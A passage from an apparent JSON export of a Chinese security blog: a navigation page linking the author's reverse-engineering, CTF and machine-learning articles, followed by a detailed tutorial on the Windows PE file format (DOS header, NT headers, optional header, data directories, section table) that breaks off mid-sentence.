[{"title":"README","url":"/posts/77cd4175.html","content":"\n由于之前手贱把整个博客给删了，导致现在这个博客里的文章排序非常混乱，本强迫症患者实在有点看不下去，用hexo的文章置顶插件也不太理想，所以干脆用此做个导航贴。\n\n<!--more-->\n\n# 基础知识\n\n- [数据结构](https://v5le0n9.github.io/posts/79666db.html)\n- [操作系统](https://v5le0n9.github.io/posts/d04bd5bc.html)\n- [计算机网络](https://v5le0n9.github.io/posts/e255a10a.html)\n\n# Windows逆向\n\n- [x86汇编基础](https://v5le0n9.github.io/posts/de6e58e0.html)\n- [OD使用教程](https://v5le0n9.github.io/posts/33a085c7.html)\n- [吾爱破解培训第一课——脱壳基础](https://v5le0n9.github.io/posts/e2d652c5.html)\n- [吾爱破解培训第二三课——去弹窗、主页锁定及DIY](https://v5le0n9.github.io/posts/7cd35487.html)\n- [吾爱破解培训第四课——去程序自校验](https://v5le0n9.github.io/posts/65ab04eb.html)\n- [吾爱破解培训第五六课——解除程序重启验证，程序打补丁](https://v5le0n9.github.io/posts/bb44dc0.html)\n- [吾爱破解培训第七课——常见的网络验证](https://v5le0n9.github.io/posts/a4cc5112.html)\n- [吾爱破解培训第八九课——深入浅出探讨脱壳细节](https://v5le0n9.github.io/posts/4b9d65e0.html)\n- [吾爱破解培训第十课——x64平台脱壳与破解实战](https://v5le0n9.github.io/posts/efe98763.html)\n- [吾爱破解学习指导教程](https://v5le0n9.github.io/posts/f398dcca.html)\n- [.Net逆向教程](https://v5le0n9.github.io/posts/784f7e1d.html)\n- 一些刷题记录：\n  - [攻防世界 逆向高手进阶区](https://v5le0n9.github.io/posts/5a99a36.html)\n  - [吾爱破解2022春节——Windows中级题](https://v5le0n9.github.io/posts/5ada4708.html)\n  - [BUUCTF 逆向合集](https://v5le0n9.github.io/posts/f4e89fa4.html)\n\n# Android逆向\n\n- [ARM汇编语言](https://v5le0n9.github.io/posts/6d8340c1.html)\n- [Android逆向入门教程](https://v5le0n9.github.io/posts/15be101a.html)\n- 一些刷题记录：\n  - [攻防世界 Android逆向合集](https://v5le0n9.github.io/posts/9f62af2.html)\n  - [吾爱破解2022春节——Android中级题](https://v5le0n9.github.io/posts/8b4ac9a8.html)\n  - [Bugku Android逆向合集](https://v5le0n9.github.io/posts/17c1c819.html)\n\n# 高级语言\n\n- [Java学习](https://v5le0n9.github.io/posts/8df0ec14.html)\n- [Python学习](https://v5le0n9.github.io/posts/e39e2a4e.html)\n\n# 机器学习\n\n- [机器学习](https://v5le0n9.github.io/posts/498ab7d9.html)\n- [感知机学习算法](https://v5le0n9.github.io/posts/2670ba0d.html)\n- [k-近邻算法](https://v5le0n9.github.io/posts/e955b133.html)\n- [朴素贝叶斯算法](https://v5le0n9.github.io/posts/ea9b7d09.html)\n\n# 密码算法\n\n- [RSA算法](https://v5le0n9.github.io/posts/855b12c4.html)\n- [Base系列算法](https://v5le0n9.github.io/posts/6b338c34.html)\n\n# Web安全\n\n- [Web渗透](https://v5le0n9.github.io/posts/54924480.html)\n- 一些小游戏：\n  - [黑客丛林之旅小游戏](https://v5le0n9.github.io/posts/9589547b.html)\n  - [monyer闯关小游戏](https://v5le0n9.github.io/posts/76c5464c.html)\n\n# 二进制安全\n\n- [pwn基础入门](https://v5le0n9.github.io/posts/1c971db4.html)\n\n"},{"title":"PE结构","url":"/posts/4dec66bb.html","content":"\nWindows逆向最基础的就是要对PE结构烂熟于心，我之前做了很多题又怎样呢，还是对PE结构一知半解，地基打不好就别梦想盖高楼。知其然知其所以然，千万不要图“快”而忽略一些重要的细节，慢就是快，这也是我这段时间悟出来的道理。\n\n<!--more-->\n\n# 1. PE的基本概念\n\nEXE和DLL文件之间的区别完全是语义上的，因为它们使用的是完全相同的PE格式，而唯一的区别就是用一个字段标识出这个文件是EXE还是DLL。\n\n64位Windows只是对PE格式做了一些简单的修饰，格式为PE32+，并没有任何新的结构加进去，改变的只是将32位字段扩展为64位。\n\nPE格式的定义主要位于头文件`winnt.h`，这个头文件几乎能找到关于PE文件的所有定义。\n\nPE文件中的数据结构一般都有32位和64位之分，一般名称上会表现出来，例如：`IMAGE_NT_HEADERS32`或`IMAGE_NT_HEADER64`。\n\n{% asset_img PE文件框架结构.jpg PE文件框架结构 %}\n\nPE文件使用的是一个平面地址空间，所有代码和数据都合并在一起，组成一个很大的结构。文件的内容被分割为不同的区块，块中包含代码或数据。各个区块按页边界来对齐，区块没有大小限制，是一个连续的结构。此外，每个块有自己在内存中的一套属性，比如区块是否包含代码、是否只读或可读可写等。\n\nPE文件不是作为单一内存映射文件被装入内存的。Windows加载器(又称PE装载器)遍历PE文件并决定文件的哪一部分被映射，这种映射方式是将文件较高的偏移位置映射到较高的内存地址中。当磁盘文件一旦被装入内存中，磁盘上的数据结构布局和内存中的数据结构布局是一致的。但数据之间的相对位置可能改变，其某项偏移地址可能不同于原始的偏移地址。\n\n{% asset_img PE文件框架结构图.png PE文件框架结构图 %}\n\n由上图可以看出，文件被映射到内存，DOS文件头、PE文件头、区块表的偏移位置和大小都没有发生改变。而各区块映射到内存后，其偏移位置发生了改变。\n\n当PE文件被Windows加载器加载到内存后，内存中的PE文件称之为模块(module)。映射文件的起始地址被称之为模块的句柄(handle)。\n\n在Windows NT中，获取了模块的句柄相当于获取了基地址，获取了基地址相当于获取了PE结构的文件头。\n\n- 基地址(ImageBase)：整个PE结构中的头地址，也就是模块的句柄。可用`HMODULE GetModuleHandle(LPCTSTR lpModuleName);`去获取模块的句柄。\n- 文件偏移地址(File Offset Address)：当PE文件存放在磁盘中，各个区块对于文件头的相对偏移地址，文件头的起始地址从0开始。\n- 虚拟地址(Virtual Address)：PE文件映射到内存中会发生比例的变化，导致与在磁盘中的地址不一致，这个内存中的地址就是虚拟地址。\n- 相对虚拟地址(Relative Virtual Address)：相对于基地址的偏移。\n\n# 2. MS-DOS头部\n\n每个PE文件是以一个DOS程序开始的，有了它，一旦程序在DOS下执行，DOS才能识别出这是有效的执行体。\n\nPE文件的第一个字节起始于一个传统的MS-DOS头部，被称作`IMAGE_DOS_HEADER`。\n\n## 2.1 IMAGE_DOS_HEADER\n\n```c\nIMAGE_DOS_HEADER STRUCT \n{ \n    +00h WORD e_magic      // Magic DOS signature MZ(4Dh 5Ah)  DOS可执行文件标志\n    +02h WORD e_cblp      // Bytes on last page of file   \n    +04h WORD e_cp       // Pages in file\n    +06h WORD e_crlc       // Relocations\n    +08h WORD e_cparhdr    // Size of header in paragraphs\n    +0ah WORD e_minalloc   // Minimun extra paragraphs needs\n    +0ch WORD e_maxalloc \t// Maximun extra paragraphs needs\n    +0eh WORD e_ss         // intial(relative)SS value     DOS代码的初始化堆栈SS \n    +10h WORD e_sp         // intial SP value     DOS代码的初始化堆栈指针SP \n    +12h WORD e_csum       // Checksum \n    +14h WORD e_ip        // intial IP value  DOS代码的初始化指令入口[指针IP] \n    +16h WORD e_cs         // intial(relative)CS value    DOS代码的初始堆栈入口 \n    +18h WORD e_lfarlc     // File Address of relocation table \n    +1ah WORD e_ovno      //   Overlay number \n    +1ch WORD e_res[4]     // Reserved words \n    +24h WORD e_oemid      //   OEM identifier(for e_oeminfo) \n    +26h WORD e_oeminfo   //  OEM information;e_oemid specific  \n    +29h WORD e_res2[10]   //  Reserved words \n    +3ch DWORD e_lfanew    // Offset to start of PE header  指向PE文件头\n}IMAGE_DOS_HEADER ENDS\n```\n\n两个重要字段：\n\n- e_magic：必须为MZ(4D 5A)开头，大小为2个字节。\n- e_lfanew：PE文件头的起始偏移地址，大小为4个字节。\n\nDOS头后跟一个DOS stub数据，是链接器链接执行文件的时候加入的部分数据，一般是“This program must be run under Microsoft Windows”。这个可以通过修改链接器的设置来修改成自己定义的数据。\n\n# 3. PE文件头\n\n紧跟着DOS stub的是PE头文件(PE Header)。PE Header是PE相关结构NT映像头(`IMAGE_NT_HEADER`)的简称，其中包含许多PE装载器用到的重要字段。执行体在支持PE文件结构的操作系统中执行时，PE装载器将从`IMAGE_DOS_HEADER`结构中的`e_lfanew`字段里找到PE Header的起始偏移量，加上基地址得到PE文件头的指针。\n$$\nPNTHeader = ImageBase + (dosHeader\\to e\\_lfanew)\n$$\nPE头的数据结构被定义为`IMAGE_NT_HEADERS`。\n\n## 3.1 IMAGE_NT_HEADERS\n\n```c\nIMAGE_NT_HEADERS STRUCT\n{\n  +0h     DWORD \t\t\t\t\tSignature\t\t\t\n  +4h     IMAGE_FILE_HEADER \t\tFileHeader\t\t\n  +18h    IMAGE_OPTIONAL_HEADER32 \tOptionalHeader\t\n}IMAGE_NT_HEADERS ENDS\n```\n\n- Signature：在一个有效的PE文件里，被设置为00004550h，也就是“PE..”，标志这是PE文件头的开始。\n- FileHeader：映像头文件结构包含了文件的物理层信息及文件属性，占20字节。\n- OptionalHeader：可选映像头是一个可选的结构，实际上`IMAGE_FILE_HEADER`结构不足以定义PE文件属性，因此可选映像头中定义了更多的数据。总共224个字节，最后128个字节为数据目录(Data Directory)。\n\n## 3.2 IMAGE_FILE_HEADER\n\n从“+4h”开始是相对于`IMAGE_NT_HEADERS`结构中的。\n\n```c\ntypedef struct _IMAGE_FILE_HEADER {\n  +4h   WORD    Machine;\t\t\t\t\t//运行平台\n  +6h   WORD    NumberOfSections;\t\t\t//文件的区块数目\n  +8h   DWORD   TimeDateStamp;\t\t\t\t//文件创建日期和时间\n  +0Ch  DWORD   PointerToSymbolTable;\t\t//指向符号表（用于调试）\n  +10h  DWORD   NumberOfSymbols;\t\t\t//符号表中符号个数（用于调试）\n  +14h  WORD    SizeOfOptionalHeader;\t\t//IMAGE_OPTIONAL_HEADER32结构大小\n  +16h  WORD    Characteristics;\t\t\t//文件属性\n} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;\n```\n\n- Machine：可执行文件的目标CPU类型。\n\n  | Value                                | Meaning       |\n  | ------------------------------------ | ------------- |\n  | IMAGE_FILE_MACHINE_I386<br />0x014c  | x86           |\n  | IMAGE_FILE_MACHINE_IA64<br />0x0200  | Intel Itanium |\n  | IMAGE_FILE_MACHINE_AMD64<br />0x8664 | x64           |\n\n- NumberOfSections：区块的数目。(区块表是紧跟在`IMAGE_NT_HEADERS`后面的)\n\n- TimeDataStamp：表明文件是何时被创建的。这个值是自1970-1-1以来用格林威治时间计算的秒数。\n\n- PointerToSymbolTable：COFF符号表的文件偏移位置，现在基本没用了。\n\n- NumberOfSymbols：如果有COFF符号表，它代表其中的符号数目，COFF符号是一个大小固定的结构，如果想找到COFF符号表的结束位置，则需要这个变量。\n\n- SizeOfOptionalHeader：紧跟着`IMAGE_FILE_HEADER`后面的数据结构(`IMAGE_OPTIONAL_HEADER`)的大小。对于32位PE文件，这个值通常为00E0h，对于64位，值为00F0h。\n\n- Characteristics：文件属性，有选择地通过几个值可以运算得到。这些标志的有效值是定义于`winnt.h`内的`IMAGE_FILE_xxx`的值，具体含义见下表。普通EXE文件的字段值一般为0100h，DLL文件值为210Eh。多种属性可通过“或运算”同时拥有。\n\n  | Value                                         | Meaning                                                      |\n  | --------------------------------------------- | ------------------------------------------------------------ |\n  | IMAGE_FILE_RELOCS_STRIPPED<br/>0x0001         | Relocation information was stripped from the file. The file must be loaded at its preferredbase address. If the base address is notavailable, the loader reports an error. |\n  | IMAGE_FILE_EXECUTABLE_IMAGE<br/>0x0002        | The file is executable (there are no unresolved external references). |\n  | IMAGE_FILE_LINE_NUMS_STRIPPED<br/>0x0004      | COFF line numbers were stripped from the file.               |\n  | IMAGE_FILE_LOCAL_SYMS_STRIPPED<br/>0x0008     | COFF symbol table entries were stripped from file.           |\n  | IMAGE_FILE_AGGRESIVE_WS_TRIM<br/>0x0010       | Aggressively trim the working set. This value is obsolete as of Windows 2000. |\n  | IMAGE_FILE_LARGE_ADDRESS_AWARE<br/>0x0020     | The application can handle addresses larger than 2 GB.       |\n  | IMAGE_FILE_BYTES_REVERSED_LO<br/>0x0080       | The bytes of the word are reversed. This flag is obsolete.   |\n  | IMAGE_FILE_32BIT_MACHINE<br/>0x0100           | The computer supports 32-bit words.                          |\n  | IMAGE_FILE_DEBUG_STRIPPED<br/>0x0200          | Debugging information was removed and stored separately in another file. |\n  | IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP<br/>0x0400 | If the image is on removable media, copy it toand run it from the swap file. |\n  | IMAGE_FILE_NET_RUN_FROM_SWAP<br/>0x0800       | If the image is on the network, copy it to and run it from the swap file. |\n  | IMAGE_FILE_SYSTEM<br/>0x1000                  | The image is a system file.                                  |\n  | IMAGE_FILE_DLL<br/>0x2000                     | The image is a DLL file. While it is an executable file, it cannot be run directly. |\n  | IMAGE_FILE_UP_SYSTEM_ONLY<br/>0x4000          | The file should be run only on a uniprocessor computer.      |\n  | IMAGE_FILE_BYTES_REVERSED_HI<br/>0x8000       | The bytes of the word are reversed. This flag is obsolete.   |\n\n## 3.3 IMAGE_OPTIONAL_HEADER32\n\n从“+18h”是相对于`IMAGE_NT_HEADERS`结构中的。\n\n```c\ntypedef struct _IMAGE_OPTIONAL_HEADER {\n  +18h  WORD    Magic;\t\t\t\t\t\t\t//标志字\n  +1Ah  BYTE    MajorLinkerVersion;\t\t\t\t//链接器主版本号\n  +1Bh  BYTE    MinorLinkerVersion;\t\t\t\t//链接器次版本号\n  +1Ch  DWORD   SizeOfCode;\t\t\t\t\t\t//所有含有代码表的总大小\n  +20h  DWORD   SizeOfInitializedData;\t\t\t//所有初始化数据表总大小\n  +24h  DWORD   SizeOfUninitializedData;\t\t//所有未初始化数据表总大小\n  +28h  DWORD   AddressOfEntryPoint;\t\t\t//程序执行入口RVA【重要】\n  +2Ch  DWORD   BaseOfCode;\t\t\t\t\t\t//代码表起始RVA\n  +30h  DWORD   BaseOfData;\t\t\t\t\t\t//数据表起始RVA\n    //以下属于NT结构增加的领域\n  +34h  DWORD   ImageBase;\t\t\t\t\t\t//程序默认装入基地址【重要】\n  +38h  DWORD   SectionAlignment;\t\t\t\t//内存中表的对齐大小【重要】\n  +3Ch  DWORD   FileAlignment;\t\t\t\t\t//文件中表的对齐大小【重要】\n  +40h  WORD    MajorOperatingSystemVersion;\t//操作系统主版本号\n  +42h  WORD    MinorOperatingSystemVersion;\t//操作系统次版本号\n  +44h  WORD    MajorImageVersion;\t\t\t\t//用户自定义主版本号\n  +46h  WORD    MinorImageVersion;\t\t\t\t//用户自定义次版本号\n  +48h  WORD    MajorSubsystemVersion;\t\t\t//所需要子系统主版本号\n  +4Ah  WORD    MinorSubsystemVersion;\t\t\t//所需要子系统次版本号\n  +4Ch  DWORD   Win32VersionValue;\t\t\t\t//保留，通常设置为0\n  +50h  DWORD   SizeOfImage;\t\t\t\t\t//映像装入内存后的总大小\n  +54h  DWORD   SizeOfHeaders;\t\t\t\t\t//DOS头、PE头、区块表总大小\n  +58h  DWORD   CheckSum;\t\t\t\t\t\t//映像校验和\n  +5Ch  WORD    Subsystem;\t\t\t\t\t\t//可执行文件期望的子系统【重要】\n  +5Eh  WORD    DllCharacteristics;\t\t\t\t//显示DLL特性的旗标\n  +60h  DWORD   SizeOfStackReserve;\t\t\t\t//初始化堆栈大小\n  +64h  DWORD   SizeOfStackCommit;\t\t\t\t//初始化实际提交堆栈大小\n  +68h  DWORD   SizeOfHeapReserve;\t\t\t\t//初始化保留堆栈大小\n  +6Ch  DWORD   SizeOfHeapCommit;\t\t\t\t//初始化实际保留堆栈大小\n  +70h  DWORD   LoaderFlags;\t\t\t\t\t//与调试相关，默认值为0\n  +74h  DWORD   NumberOfRvaAndSizes;\t\t\t//数据目录表的项数(总是16)\n  +78h  IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];//数据目录表【重要】\n} IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;\n```\n\n事实上，这个结构中的大部分字段都不重要，但有些病毒恰恰利用这些字段做手脚。\n\n- AddressOfEntryPoint：指出文件被执行时的入口地址，这是一个RVA地址。如果在一个可执行文件上附加了一段代码并想让这段代码首先被执行，那么只需要将这个入口地址指向附加的代码即可。\n\n- ImageBase：指出文件的优先装入地址。文件被执行时，如果可能的话，Windows优先将文件装入到由`ImageBase`字段指定的地址中，只有指定的地址已经被其它模块使用时，文件才被装入到其它地址中。链接器产生可执行文件的时候对应这个地址来生成机器码，所以当文件被装入这个地址时不需要进行重定位操作，装入的速度最快，如果文件被装载到其它地址的话，将不得不进行重定位操作，这样就要慢一点。\n\n  对于EXE文件来说，由于每个文件总是使用独立的虚拟地址空间，优先装入地址不可能被其它模块占据，所以EXE总是能够按照这个地址装入，这也意味着EXE文件不再需要重定位信息。\n\n  对于DLL文件来说，由于多个DLL文件全部使用宿主EXE文件的地址空间，不能保证优先装入地址没有被其它的DLL使用，所以DLL文件中必须包含重定位信息以防万一。因此，在前面介绍的`IMAGE_FILE_HEADER`结构的`Characteristics`字段中，DLL文件对应的`IMAGE_FILE_RELOCS_STRIPPED`位总是为0，而EXE文件的这个标志位总是为1。\n\n  在链接的时候，可以通过对`link.exe`指定`/base:address`选项来自定义优先装入地址，如果不指定这个选项的话，一般EXE文件的默认优先装入地址被定为00400000h，而DLL文件的默认优先装入地址被定为10000000h。\n\n- SectionAlignment和FileAlignment：`SectionAlignment`字段指定了节被装入内存后的对齐单位。也就是说，每个节被装入的地址必定是本字段指定数值的整数倍。在内存中对齐默认以1000h为单位。而`FileAlignment`字段指定了节存储在磁盘文件中时的对齐单位。在磁盘中对齐默认以200h为单位。\n\n  在64位下内存对齐以2000h为单位，如果32位程序想在64位系统下实现兼容，将`SectionAlignment`值设为2000h即可。\n\n- Subsystem：指定使用界面的子系统，它的取值如下表所示。这个字段决定了系统如何为程序建立初始的界面，链接时的`/subsystem:xxx`选项指定的就是这个字段的值。如果将子系统指定为Windows CUI，那么系统会自动为程序建立一个控制台窗口，而指定为Windows GUI的话，窗口必须由程序自己建立。\n\n  | 取值 | Windows.inc中的预定义值        | 含义                       |\n  | ---- | ------------------------------ | -------------------------- |\n  | 0    | IMAGE_SUBSYSTEM_UNKNOWN        | 未知的子系统               |\n  | 1    | IMAGE_SUBSYSTEM_NATIVE         | 不需要子系统（如驱动程序） |\n  | 2    | IMAGE_SUBSYSTEM_WINDOWS_GUI    | Windows图形界面            |\n  | 3    | IMAGE_SUBSYSTEM_WINDOWS_CUI    | Windows控制台界面          |\n  | 5    | IMAGE_SUBSYSTEM_OS2_CUI        | OS2控制台界面              |\n  | 7    | IMAGE_SUBSYSTEM_POSIX_CUI      | POSIX控制台界面            |\n  | 8    | IMAGE_SUBSYSTEM_NATIVE_WINDOWS | 不需要子系统               |\n  | 9    | IMAGE_SUBSYSTEM_WINDOWS_CE_GUI | Windows CE图形界面         |\n\n- DataDirectory：最重要字段之一，它由16个相同的`IMAGE_DATA_DIRECTORY`结构组成，虽然PE文件中的数据是按照装入内存后的页属性归类而被放在不同的节中的，但是这些处于各个节中的数据按照用途可以被分为导出表、导入表、资源、重定位表等数据块，这16个`IMAGE_DATA_DIRECTORY`结构就是用来定义多种不同用途的数据块的。`IMAGE_DATA_DIRECTORY`结构的定义很简单，它仅仅指出了某种数据块的位置和长度。\n\n  `DataDirectory`是`OptionalHeader`的最后128个字节，也是`IMAGE_NT_HEADERS`的最后一部分数据。\n\n## 3.4 IMAGE_DATA_DIRECTORY\n\n```c\ntypedef struct _IMAGE_DATA_DIRECTORY {\n    DWORD   VirtualAddress;\t\t\t//数据块的起始RVA\n    DWORD   Size;\t\t\t\t\t//数据块的长度\n} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;\n```\n\n16个数据目录的含义：\n\n{% asset_img IMAGE_DATA_DIRECTORY.jpg 16个数据目录的含义 %}\n\n在PE文件中寻找特定的数据时就是从这些`IMAGE_DATA_DIRECTORY`结构开始的，比如要存取资源，那么必须从第3个`IMAGE_DATA_DIRECTORY`结构（索引为2）中得到资源数据块的大小和位置；同理，如果要查看PE文件导入了哪些DLL文件的哪些API函数，那就必须首先从第2个`IMAGE_DATA_DIRECTORY`结构得到导入表的位置和大小。\n\n# 4. 区块表(节表)\n\n## 4.1 PE文件到内存的映射\n\n在执行一个PE文件的时候，Windows并不在一开始就将整个文件读入内存，而是采用与内存映射文件类似的机制。也就是说，Windows装载器在装载的时候仅仅建立好虚拟地址和PE文件之间的映射关系。当且仅当真正执行到某个内存页中的指令或者访问某一页的数据时，这个页面才会被从磁盘提交到物理内存，这种机制使文件装入的速度和文件大小没有太大关系。\n\n需要注意的是，系统装载可执行文件的方法又不完全等同于内存映射文件。当使用内存映射文件的时候，数据本身和数据之间的相对位置是完全相同的；而在装载可执行文件的时候，有些数据在装入前会被预处理，如重定位等，正因此，装入以后，数据之间的相对位置可能发生微妙的变化。\n\nWindows装载器装载DOS头部、PE文件头和区块表部分是不进行任何特殊处理的，而在装载区块的时候则会自动按区块的属性做不同的处理。\n\n一般情况下，它会处理以下几个方面的内容：\n\n- 内存页的属性：对于磁盘映射文件来说，所有的页都是按照磁盘映射文件函数指定的属性设置的。但是在装载可执行文件时，与节对应的内存页属性要按照节的属性来设置。所以，在同属于一个模块的内存页中，从不同节映射过来的内存页的属性是不同的。\n\n- 区块的偏移地址：节的起始地址在磁盘文件中是按照`IMAGE_OPTIONAL_HEADER32`结构的`FileAlignment`字段的值进行对齐的，而当被加载到内存中时是按照同一结构中的`SectionAlignment`字段的值对齐的，两者的值可能不同，所以一个节被装入内存后相对于文件头的偏移和在磁盘文件中的偏移可能是不同的。\n\n  注意，节事实上就是相同属性数据的组合。当节被装入到内存中的时候，相同一个节所对应的内存页都将被赋予相同的页属性， 事实上，Windows 系统对内存属性的设置是以页为单位进行的，所以节在内存中的对齐单位必须至少是一个页的大小（对于32位操作系统来说，这个值一般是4KB(1000H)；对于64位操作系统这个值一般是8KB(2000H)）。\n\n  节在磁盘中就没有最小4KB的限制，为了减少磁盘文件的大小，文件对齐的单位一般要小于内存对齐的单位(`FileAlignment`的值一般为200h)，这样，在磁盘中就不必为每个节对齐4KB的大小了。\n\n- 区块的大小：对节的尺寸的处理主要分为两个方面：\n\n  第一个方面，由于磁盘映像和内存映像中节对齐存储单位的不同而导致了长度扩展不同；\n\n  第二个方面，是对于包含未初始化数据的节的处理问题。既然是未初始化，那么没有必要为其在磁盘中浪费空间资源，但在内存中不同，因为程序一运行，之前未初始化的数据便有可能要被赋值初始化，那么就必须为它们留下空间。\n\n- 不进行映射的区块：有些节并不需要被映射到内存中，例如`.reloc`节，重定位数据对于文件的执行代码来说是透明的，无作用的，它只是提供Windows装载器使用，执行代码根本不会去访问到它们，所以没有必要将它们映射到物理内存中。\n\n## 4.2 节表\n\nPE文件中所有节的属性都被定义在节表中，节表由一系列的`IMAGE_SECTION_HEADER`结构排列而成，每个结构用来描述一个节，结构的排列顺序和它们描述的节在文件中的排列顺序是一致的。全部有效结构的最后以一个空的`IMAGE_SECTION_HEADER`结构作为结束，所以节表中`IMAGE_SECTION_HEADER`结构数量等于节的数量加一。节表总是被存放在紧接在PE文件头的地方。\n\n另外，节表中`IMAGE_SECTION_HEADER`结构的总数总是由PE文件头 `IMAGE_NT_HEADERS`结构中的`FileHeader.NumberOfSections`字段来指定的。\n\n## 4.3 IMAGE_SECTION_HEADER\n\n```c\ntypedef struct _IMAGE_SECTION_HEADER {\n    BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; //节表名称，如.text\n    //IMAGE_SIZEOF_SHORT_NAME=8\n    union\t\t\t\t\t\t\n    {\n        DWORD PhysicalAddress;\t//物理地址\n        DWORD VirtualSize;\t\t//区块尺寸\n        //这两个值是一个联合结构，可以使用其中的任何一个，一般取后者\n    }Misc;                     \n    DWORD VirtualAddress;\t\t//区块的RVA地址\n    DWORD SizeOfRawData;\t\t//在文件中对齐后的尺寸\n    DWORD PointerToRawData;\t\t//在文件中偏移\n    DWORD PointerToRelocations;\t//在OBJ文件中使用，重定位的偏移\n    DWORD PointerToLinenumbers;\t//行号表的偏移（供调试使用）\n    WORD NumberOfRelocations;\t//在OBJ文件中使用，重定位项数目\n    WORD NumberOfLinenumbers;\t//行号表中行号的数目\n    DWORD Characteristics;\t\t//区块属性如可读，可写，可执行等\n}IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;\n```\n\n重要字段说明如下：\n\n- Name：区块名。这是一个由8位的ASCII码名，用来定义区块的名称。多数区块名都习惯性以一个“.”作为开头（例如：.text），但这个“.” 实际上不是必须的。值得注意的是，如果区块名超过8个字节，则没有最后的终止标志“NULL”字节。并且前边带有一个“\\$”的区块名字会从链接器那里得到特殊的待遇，前边带有“\\$”的相同名字的区块在载入时候将会被合并，在合并之后的区块中，它们是按照“\\$”后边的字符的字母顺序进行合并的。\n\n  每个区块的名称都是唯一的，不能有同名的两个区块。但事实上节的名称不代表任何含义，它的存在仅仅是为了正规统一编程的时候方便程序员查看方便而设置的一个标记而已。所以将包含代码的区块命名为“.Data”或者将包含数据的区块命名为“.Code”都是合法的。\n\n  当我们要从PE文件中读取需要的区块的时候，不能以区块的名称作为定位的标准和依据，正确的方法是按照`IMAGE_OPTIONAL_HEADER32`结构中的数据目录字段结合进行定位。\n  \n- VirtualSize：对表对应的区块的大小，这是区块的数据在没有进行对齐处理前的实际大小。\n\n- VirtualAddress：该区块装载到内存中的RVA 地址。这个地址是按照内存页来对齐的，因此它的数值总是`SectionAlignment`的值的整数倍。\n\n- SizeOfRawData：该区块在磁盘中所占的大小，这个数值等于`VirtualSize`字段的值按照`FileAlignment`的值对齐以后的大小。\n\n- PointerToRawData：指出节在磁盘文件中所处的位置。这个数值是从文件头开始算起的偏移量。\n\n依靠上面4个字段的值，装载器就可以从PE文件中找出某个节(从`PointerToRawData`偏移开始的`SizeOfRawData`字节)的数据，并将它映射到内存中去(映射到从模块基地址偏移`VirtualAddress`的地方，并占用以`VirtualSize`的值按照页的尺寸对齐后的空间大小)。\n\n- Characteristics：该区块的属性。该字段是按位来指出区块的属性（如代码/数据/可读/可写等）的标志。可通过链接器的`/SECTION`选项设置， 下面是比较重要的标志：\n\n\n| 字段值                                            | 用途                                               |\n| ------------------------------------------------- | -------------------------------------------------- |\n| IMAGE_SCN_CNT_CODE<br />0x00000020                | 包含代码，常与0x10000000一起设置                   |\n| IMAGE_SCN_CNT_INITIALIZED_DATA<br />0x00000040    | 该块包含已初始化的数据                             |\n| IMAGE_SCN_CNT_UNINITIALIZED_DATA<br /> 0x00000080 | 该块包含未初始化的数据                             |\n| IMAGE_SCN_MEM_DISCARDABLE<br />0x02000000         | 该块可被丢弃，一旦加载可被丢弃的块.reloc(重定位块) |\n| IMAGE_SCN_MEM_SHARED<br />0x10000000              | 共享块                                             |\n| IMAGE_SCN_MEM_EXECUTE<br />0x20000000             | 该块可执行，通常与0x00000020标志一起被设置         |\n| IMAGE_SCN_MEM_READ<br />0x40000000                | 该块可读                                           |\n| IMAGE_SCN_MEM_WRITE<br />0x80000000               | 该块可写                                           |\n\n\n\n# 6. 区块(节)\n\n通常，区块中的数据在逻辑上是关联的。PE 文件一般至少都会有两个区块：一个是代码块，另一个是数据块。每一个区块都需要有一个截然不同的名字，这个名字主要是用来表达区块的用途。例如有一个区块叫.rdata，表明他是一个只读区块。注意：区块在映像中是按起始地址（RVA）来排列的，而不是按字母表顺序。另外，使用区块名字只是人们为了认识和编程的方便，而对操作系统来说这些是无关紧要的。微软给这些区块取了个有特色的名字，但这不是必须的。当编程从PE 文件中读取需要的内容时，如输入表、输出表，不能以区块名字作为参考，正确的方法是按照数据目录表中的字段来进行定位。\n\n区块名称以及意义： \n\n| 名称     | 描述                                                         |\n| -------- | ------------------------------------------------------------ |\n| .text    | 默认的区块代码，它的内容全是指令代码                         |\n| .data    | 默认的读/写数据区块，全局变量、静态变量一般放这              |\n| .rdata   | 默认的只读数据区块                                           |\n| .idata   | 包含其他外来DLL的函数及数据信息，即输入表                    |\n| .edata   | 输出表                                                       |\n| .rsrc    | 资源，包含模块的全部资源，如图标、菜单、位图等               |\n| .bss     | 未初始化数据                                                 |\n| .tls     | 线程局部存储器，包含数据的初始化值，运行时所需要的额外变量   |\n| .reloc   | 可执行文件的基址重定位，基址重定位一般仅是DLL文件才需要      |\n| .sdata   | 通过全局指针相对寻址的“短”可读/写数据                        |\n| .srdata  | 通过全局指针相对寻址的“短”只读数据                           |\n| .pdata   | 异常表                                                       |\n| .debug$S | OBJ文件中Codeview格式的符号，是一个可变长的Codeview格式符号记录流 |\n| .debug$T | OBJ文件中Codeview格式的类型记录，是一个可变长的Codeview格式类型记录流 |\n| .debug$P | 使用预编译头时会出现在OBJ文件中                              |\n| .drectve | 只用于OBJ文件，包含一些链接器指令                            |\n| .didat   | 延迟加载的导入数据                                           |\n\n在Visual C++中也可以自定义区块名字，用#pragma来声明，告诉编译器插入数据到这个区块内：\n\n```c\n#pragma data_seg(\"MY_DATA\") \n```\n\n链接器的一个有趣特征就是能够合并区块。如果两个区块有相似、一致性的属性，那么它们在链接的时候能被合并成一个单一的区块。这取决于是否开启编译器的` /merge `开关。下面的链接器选项将.rdata与.text区块合并为一个.text区块：`/MERGE : .rdata = .text`\n\n注意：当合并区块时，因为这没有什么硬性规定。例如，把.rdata合并到.text里不会有什么问题，但是不应该将.rsrc、.reloc或者.pdata合并到其它的区块里。\n\n### 1.6.1 区块的对齐\n\n区块大小是要对齐的，有两种对齐值，一种用于磁盘文件内，另一种用于内存中。PE文件头指出了这两个值，它们可以不同。PE 文件头里边的FileAligment 